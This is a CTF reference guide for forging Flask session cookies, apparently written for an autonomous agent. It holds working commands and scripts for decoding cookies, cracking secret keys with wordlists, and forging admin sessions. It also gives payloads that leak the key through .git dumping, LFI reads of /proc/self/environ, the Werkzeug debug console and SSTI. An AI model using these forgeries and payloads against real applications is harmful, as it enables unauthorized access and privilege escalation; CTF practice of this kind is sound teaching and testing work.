# Flask Session Cookie Forgery - CTF Reference

> **Document Purpose:** Actionable Flask session cookie analysis, decoding, cracking, and forgery techniques for CTF challenges. Covers the itsdangerous signing format, brute-forcing secret keys, forging privileged sessions, and finding leaked secrets for autonomous agent retrieval.

---

## 1. Flask Session Cookie Format

> **When to use this section:** You identify a Flask application and want to understand how its session cookies are structured.

**Tags:** `flask, session-cookie, itsdangerous, format, structure`

**Cookie Structure:** Flask sessions use the `itsdangerous` library with a three-part format:
```
<base64url-payload>.<base64url-timestamp>.<base64url-signature>
```

**Example Cookie:**
```
eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZjKxMA.YH2OxKlMVqJ8TeLBm7NpWYvx_8s
```

**Breakdown:**
```
Part 1 (Payload):   eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ
Part 2 (Timestamp): ZjKxMA
Part 3 (Signature): YH2OxKlMVqJ8TeLBm7NpWYvx_8s
```

**Payload Encoding:**
- Base64url encoded (URL-safe base64 with `-` and `_` instead of `+` and `/`)
- Padding (`=`) is stripped (must be re-added for decoding)
- Optionally zlib-compressed (indicated by a `.` prefix before base64 data)

**Timestamp Format:**
- Unsigned 32-bit integer representing Unix epoch time
- Base64url encoded
- Allows the server to expire sessions based on age

**Signature:**
- HMAC-SHA1 by default (older Flask) or HMAC-SHA512 (newer Flask)
- Derived from the application's `SECRET_KEY`
- Salt: `"cookie-session"` (default for Flask sessions)

---

## 2. Decoding Flask Session Cookies

> **When to use this section:** You have a Flask session cookie and want to read its contents without knowing the secret key.

### 2.1 Manual Decoding

**Tags:** `flask, session-cookie, decoding, base64, inspection`

**Python Decoding Script:**
```python
import base64
import json
import zlib

def decode_flask_cookie(cookie):
    """Decode a Flask session cookie payload (no secret needed)."""
    payload = cookie.split('.')[0]

    # Check for compression (leading dot)
    compressed = False
    if payload.startswith('.'):
        compressed = True
        payload = payload[1:]

    # Fix base64 padding
    padding = 4 - len(payload) % 4
    if padding != 4:
        payload += '=' * padding

    # Decode base64url
    data = base64.urlsafe_b64decode(payload)

    # Decompress if needed
    if compressed:
        data = zlib.decompress(data)

    return json.loads(data)

# Example usage
cookie = "eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZjKxMA.YH2OxKlMVqJ8TeLBm7NpWYvx_8s"
print(decode_flask_cookie(cookie))
# Output: {"admin": false, "username": "guest"}
```

### 2.2 Using flask-unsign

**Tags:** `flask, session-cookie, flask-unsign, decoding, tool`

```bash
# Install flask-unsign
pip install flask-unsign

# Decode a cookie (no secret needed)
flask-unsign --decode --cookie 'eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ3Vlc3QifQ.ZjKxMA.YH2OxKlMVqJ8TeLBm7NpWYvx_8s'
# Output: {'admin': False, 'username': 'guest'}
```

### 2.3 Compressed Cookies

**Tags:** `flask, session-cookie, compression, zlib`

```python
# Compressed cookies start with a dot before the base64 payload
# Example: .eJxNjLEOgCAQRP_laiuMF-DXjAcHkigXAqaR-HdBG5uZzOS9DWq...

# The dot indicates the payload was zlib-compressed before base64 encoding
# Decompression is handled automatically by the decode function above
```

**Why Compression:** Flask compresses the session data with zlib if the compressed version is smaller than the uncompressed version. This is common with larger session payloads.

---

## 3. Flask Session Signing Internals

> **When to use this section:** You need to understand how Flask signs cookies to forge your own.

**Tags:** `flask, session-cookie, signing, hmac, itsdangerous, internals`

**Signing Process:**
```python
# Flask's signing process (simplified)
import hmac
import hashlib

def derive_key(secret_key, salt="cookie-session"):
    """Flask derives the signing key from SECRET_KEY using HMAC."""
    return hmac.new(
        key=secret_key.encode(),
        msg=salt.encode(),
        digestmod=hashlib.sha1
    ).digest()

def sign_cookie(payload_b64, timestamp_b64, secret_key):
    """Sign a Flask session cookie."""
    derived = derive_key(secret_key)
    signing_input = payload_b64 + "." + timestamp_b64
    signature = hmac.new(
        key=derived,
        msg=signing_input.encode(),
        digestmod=hashlib.sha1
    ).digest()
    return signing_input + "." + base64url_encode(signature)
```

**Key Derivation Details:**
- Salt: `"cookie-session"` (hardcoded default in Flask)
- Key derivation: `HMAC-SHA1(SECRET_KEY, "cookie-session")`
- The derived key is used to HMAC-sign the `payload.timestamp` string
- Flask uses `itsdangerous.URLSafeTimedSerializer` under the hood

**Signing Algorithm Versions:**
```python
# Flask < 2.3: HMAC-SHA1 (default)
# Flask >= 2.3: HMAC-SHA512 (default, configurable)
# The algorithm can be checked by examining the signature length:
#   SHA1 signature: ~27 base64 characters
#   SHA512 signature: ~86 base64 characters
```

---

## 4. Brute-Forcing the Secret Key

> **When to use this section:** You have a valid Flask session cookie and want to discover the SECRET_KEY to forge new cookies.

### 4.1 Using flask-unsign Wordlist Attack

**Tags:** `flask, session-cookie, forgery, brute-force, flask-unsign, secret-key`

```bash
# Brute-force with a wordlist
flask-unsign --unsign --cookie 'eyJhZG1pbiI6ZmFsc2V9.ZjKxMA.abc123' --wordlist /usr/share/wordlists/rockyou.txt

# Brute-force with flask-unsign's built-in wordlist
flask-unsign --unsign --cookie 'eyJhZG1pbiI6ZmFsc2V9.ZjKxMA.abc123' --no-literal-eval

# Output on success:
# [*] Session decodes to: {'admin': False}
# [*] HMAC SHA1 key found: 'supersecretkey'
```

### 4.2 Common Weak Secret Keys

**Tags:** `flask, session-cookie, weak-secrets, common-keys, wordlist`

**Try These First (Most Common in CTFs):**
```
secret
secret_key
secretkey
supersecret
supersecretkey
password
password123
flask-secret
my-secret-key
change-me
development
dev
test
testing
debug
key
s3cr3t
default
app-secret
mysecretkey
CHANGE_ME
hackme
```

**Python Quick Brute-Force:**
```python
from itsdangerous import URLSafeTimedSerializer, BadSignature

cookie = "eyJhZG1pbiI6ZmFsc2V9.ZjKxMA.abc123"

common_secrets = [
    "secret", "secret_key", "supersecret", "password",
    "password123", "flask-secret", "change-me", "dev",
    "test", "debug", "key", "s3cr3t", "default",
    "hackme", "mysecretkey", "CHANGE_ME", "development",
]

for secret in common_secrets:
    try:
        s = URLSafeTimedSerializer(secret)
        data = s.loads(cookie, salt="cookie-session")
        print(f"[+] Secret found: {secret}")
        print(f"[+] Session data: {data}")
        break
    except BadSignature:
        continue
else:
    print("[-] Secret not found in common list")
```

### 4.3 Hashcat / John the Ripper

**Tags:** `flask, session-cookie, hashcat, john, cracking`

```bash
# Extract hash for hashcat (custom format)
# flask-unsign can export in crackable format
flask-unsign --unsign --cookie 'COOKIE_HERE' --server 'http://target.com/login'

# For offline cracking, extract the components manually:
# payload.timestamp:signature (as HMAC-SHA1)
```

---

## 5. Forging Flask Session Cookies

> **When to use this section:** You have discovered the SECRET_KEY and want to create a forged session cookie with modified claims.

### 5.1 Using flask-unsign to Forge

**Tags:** `flask, session-cookie, forgery, privilege-escalation, flask-unsign`

```bash
# Forge a cookie with admin=True
flask-unsign --sign --cookie "{'admin': True, 'username': 'admin'}" --secret 'supersecretkey'

# Forge with specific values
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin', 'is_admin': True}" --secret 'mysecret'
```

### 5.2 Python Forging Script

**Tags:** `flask, session-cookie, forgery, python, itsdangerous`

```python
from itsdangerous import URLSafeTimedSerializer

def forge_flask_cookie(secret_key, session_data):
    """Forge a Flask session cookie with arbitrary data."""
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(session_data, salt="cookie-session")

# Example: Escalate to admin
secret = "supersecretkey"
forged = forge_flask_cookie(secret, {
    "admin": True,
    "username": "admin",
    "role": "superadmin"
})
print(f"Forged cookie: {forged}")

# Use with requests
import requests
session = requests.Session()
session.cookies.set("session", forged, domain="target.com")
response = session.get("http://target.com/admin")
print(response.text)
```

### 5.3 Common Session Fields to Modify

**Tags:** `flask, session-cookie, forgery, fields, privilege-escalation`

**Authentication / Authorization Fields:**
```python
# Boolean flags
{"admin": True}
{"is_admin": True}
{"authenticated": True}
{"verified": True}
{"is_staff": True}
{"is_superuser": True}

# Role-based
{"role": "admin"}
{"role": "superadmin"}
{"role": "root"}
{"user_type": "admin"}
{"access_level": 9999}
{"permissions": ["admin", "read", "write", "delete"]}

# User identity
{"user_id": 1}              # Admin is often user_id 1
{"username": "admin"}
{"email": "admin@target.com"}
{"uid": 0}                  # Root-like ID
```

**Session State Fields:**
```python
# Login state
{"logged_in": True, "user": "admin"}
{"_user_id": "1"}           # Flask-Login format
{"_fresh": True}             # Flask-Login "fresh" session

# CSRF tokens (sometimes in session)
{"csrf_token": "..."}        # May need to match form token
```

---

## 6. Finding the Secret Key

> **When to use this section:** Brute-force failed and you need to find the SECRET_KEY through other means.

### 6.1 Source Code Disclosure

**Tags:** `flask, session-cookie, secret-key, source-code, disclosure`

**Common Locations in Flask Apps:**
```python
# app.py / config.py / settings.py
app.secret_key = "hardcoded_secret"
app.config['SECRET_KEY'] = "hardcoded_secret"
SECRET_KEY = os.environ.get('SECRET_KEY', 'default_fallback')

# .env file
SECRET_KEY=mysupersecretkey
FLASK_SECRET_KEY=changemeinproduction
```

**Files to Check:**
```
app.py, main.py, config.py, settings.py
.env, .flaskenv
config/default.py, config/development.py
instance/config.py
requirements.txt (check Flask version for default behaviors)
```

### 6.2 Git Repository Leak

**Tags:** `flask, session-cookie, secret-key, git-leak, source-disclosure`

```bash
# Check for exposed .git directory
curl -s http://target.com/.git/HEAD
# If 200: "ref: refs/heads/main"

# Download git objects
curl -s http://target.com/.git/config
curl -s http://target.com/.git/refs/heads/main

# Use git-dumper to extract full repo
pip install git-dumper
git-dumper http://target.com/.git/ ./dumped_repo
cd dumped_repo
grep -r "SECRET_KEY\|secret_key\|app.secret" .

# Check git history for removed secrets
git log --all --oneline
git log -p --all -S "SECRET_KEY"
git diff HEAD~5..HEAD
```

### 6.3 Local File Inclusion (LFI)

**Tags:** `flask, session-cookie, secret-key, lfi, file-read`

```
# Read Flask app source via LFI
/vulnerable?file=../app.py
/vulnerable?file=../config.py
/vulnerable?file=../../app/main.py

# Read environment variables
/vulnerable?file=/proc/self/environ
  -> SECRET_KEY=... visible in environment dump

# Read /proc/self/cmdline for app path
/vulnerable?file=/proc/self/cmdline
  -> python\x00/app/main.py  (reveals app location)
```

### 6.4 Debug Pages and Error Leaks

**Tags:** `flask, session-cookie, secret-key, debug, werkzeug, error-leak`

```
# Flask debug mode endpoints
http://target.com/console        # Werkzeug debugger console
http://target.com/?debugger=yes  # Sometimes triggers debug mode

# If Werkzeug debugger is enabled, you can execute Python:
>>> import flask; print(flask.current_app.config['SECRET_KEY'])
>>> import os; print(os.environ.get('SECRET_KEY'))

# Error pages may leak config in stack traces
# Trigger errors with malformed input to see local variables
```

### 6.5 Server-Side Template Injection (SSTI)

**Tags:** `flask, session-cookie, secret-key, ssti, jinja2`

```python
# If SSTI exists in the Flask app, read the secret key directly
{{config['SECRET_KEY']}}
{{config.SECRET_KEY}}
{{app.config['SECRET_KEY']}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['current_app'].config['SECRET_KEY']}}
```

### 6.6 Backup and Configuration Files

**Tags:** `flask, session-cookie, secret-key, backup, config-files`

```
# Common backup/config file locations
/app.py.bak, /app.py~, /app.py.swp
/.env, /.env.bak, /.env.example
/config.py.bak, /settings.py.old
/docker-compose.yml (may contain SECRET_KEY in environment)
/Dockerfile (may set SECRET_KEY via ENV)
/backup.zip, /source.tar.gz
```

---

## 7. Django Session Cookie Comparison

> **When to use this section:** You encounter a Django application and want to understand how its session cookies differ from Flask.

**Tags:** `flask, django, session-cookie, comparison, signing`

**Django vs Flask Session Cookies:**
```
Feature              | Flask                        | Django
---------------------|------------------------------|--------------------------------
Library              | itsdangerous                 | django.core.signing
Format               | payload.timestamp.signature  | payload:timestamp:signature
Encoding             | base64url + optional zlib    | base64url + zlib
Signing              | HMAC-SHA1/SHA512             | HMAC-SHA256
Salt                 | "cookie-session"             | "django.contrib.sessions..."
Key derivation       | HMAC(SECRET_KEY, salt)       | PBKDF2(SECRET_KEY, salt)
Cookie name          | "session" (default)          | "sessionid" (default)
Server-side store    | No (client-side by default)  | Yes (DB/cache/file by default)
```

**Django Signed Cookie Sessions:**
```python
# Django can use client-side sessions (less common):
# settings.py: SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'

# Decoding Django signed cookies
import django.core.signing
data = django.core.signing.loads(
    cookie_value,
    key=SECRET_KEY,
    salt='django.contrib.sessions.backends.signed_cookies'
)
```

**Django Cracking:**
```bash
# Use django-unsign or custom scripts
# Django key derivation is slower (PBKDF2) making brute-force harder
pip install django-unsign
django-unsign --cookie "session_value" --wordlist rockyou.txt
```

---

## 8. Common CTF Patterns

> **When to use this section:** Solving Flask session forgery challenges in CTF competitions.

**Tags:** `flask, session-cookie, ctf, patterns, walkthrough`

**Pattern 1: Direct Admin Escalation**
```
Challenge: "Access the admin panel"
Step 1: Login as guest, get session cookie
Step 2: Decode cookie -> {"admin": false, "username": "guest"}
Step 3: Try common secrets with flask-unsign --unsign
Step 4: Forge cookie with {"admin": true, "username": "admin"}
Step 5: Set forged cookie, visit /admin, get flag
```

**Pattern 2: Secret in Source Code**
```
Challenge: "Forge your identity"
Step 1: Find .git directory exposed, dump with git-dumper
Step 2: grep for SECRET_KEY in source -> found in config.py
Step 3: Decode session -> {"role": "user", "user_id": 42}
Step 4: Forge with {"role": "admin", "user_id": 1}
Step 5: Access /dashboard as admin
```

**Pattern 3: Secret via SSTI**
```
Challenge: Flask app with template injection and admin-only flag page
Step 1: Discover SSTI via {{7*7}} -> 49 in response
Step 2: Leak secret: {{config.SECRET_KEY}} -> "my-dev-secret"
Step 3: Decode current session, forge with admin=True
Step 4: Access /flag with forged admin session
```

**Pattern 4: Weak Secret / Default**
```
Challenge: "Login as admin"
Step 1: Register account, get session cookie
Step 2: Try flask-unsign with top 20 common secrets
Step 3: Secret is "secret" or "password" or empty string
Step 4: Forge admin session, retrieve flag
```

**Pattern 5: Debug Mode Leak**
```
Challenge: Flask app with errors
Step 1: Trigger error (malformed input, division by zero)
Step 2: Flask debug page shows stack trace with local variables
Step 3: Find SECRET_KEY in app config shown in traceback
Step 4: Forge session cookie
```

**CTF Playbook:**
1. Identify Flask (look for `session` cookie name, `Server: Werkzeug`, error page style)
2. Decode the session cookie (no secret needed) to understand its structure
3. Try brute-forcing with common weak secrets first (fast, often works in CTFs)
4. If brute-force fails, look for source disclosure (.git, LFI, backup files)
5. If SSTI exists, use `{{config.SECRET_KEY}}` to leak the key directly
6. Check for Werkzeug debug console at `/console`
7. Forge the cookie with escalated privileges
8. Common fields to escalate: `admin`, `is_admin`, `role`, `user_id`

---

## 9. Agent Takeaway

> - Use `encoding` tool with `base64_decode` operation to decode Flask session cookie payloads
> - Use `http_fetch` to test forged cookies by setting the `session` cookie value
> - Use `cookie_set` tool to inject forged session cookies into the shared session
> - Flask session cookies can always be decoded without the secret (only signing requires it)
> - The most common CTF secret keys are: `secret`, `supersecretkey`, `password`, `change-me`, `dev`
> - Salt is always `"cookie-session"` for Flask sessions (hardcoded default)
> - If brute-force fails, prioritize source code disclosure via .git leak, LFI, or SSTI
> - Check for the Werkzeug debugger console at `/console` as it allows direct Python execution
> - When forging, change `admin` to `True`, `role` to `"admin"`, and/or `user_id` to `1`
> - Django sessions use different signing (PBKDF2 + HMAC-SHA256) and are harder to brute-force
> - Always decode the cookie first to understand what fields the application checks
> - SSTI leak via `{{config.SECRET_KEY}}` is often the intended solution path in CTFs
